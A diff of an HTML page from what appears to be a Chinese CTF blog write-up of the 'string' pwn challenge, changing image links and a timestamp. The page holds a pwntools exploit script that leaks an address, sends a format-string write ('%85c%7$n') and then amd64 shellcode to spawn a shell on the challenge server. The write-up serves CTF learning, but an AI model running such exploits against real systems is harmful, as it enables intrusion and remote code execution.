@@ -15,12 +15,12 @@
 <meta property="og:site_name" content="mark0">
 <meta property="og:description" content="其它大佬讲解的write up，作为菜鸟的我看不明白，这里记录一下个人解题思路">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2020/08/06/dgN5EFvW7pT6XLI.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string.jpg">
 <meta property="article:published_time" content="2020-07-29T05:56:40.172Z">
-<meta property="article:modified_time" content="2020-08-06T08:12:07.370Z">
+<meta property="article:modified_time" content="2020-08-15T05:47:37.646Z">
 <meta property="article:author" content="mark0">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/08/06/dgN5EFvW7pT6XLI.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string.jpg">
   
     <link rel="alternative" href="/atom.xml" title="mark0" type="application/atom+xml">
   
@@ -168,7 +168,7 @@
         <p>其它大佬讲解的write up，作为菜鸟的我看不明白，这里记录一下个人解题思路</p>
 <a id="more"></a>
 
-<p><img src="https://i.loli.net/2020/08/06/dgN5EFvW7pT6XLI.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string.jpg" alt=""></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">53574</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">addr = int(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"What should your character's name be:"</span>, <span class="string">"hhh"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>, <span class="string">"east"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"'Give me an address'"</span>, str(addr))</span><br><span class="line">payload_1 = <span class="string">"%85c%7$n"</span></span><br><span class="line">p.sendlineafter(<span class="string">"And, you wish is:"</span>, payload_1)</span><br><span class="line">payload_2 = asm(shellcraft.amd64.sh(), arch=<span class="string">"amd64"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>, payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
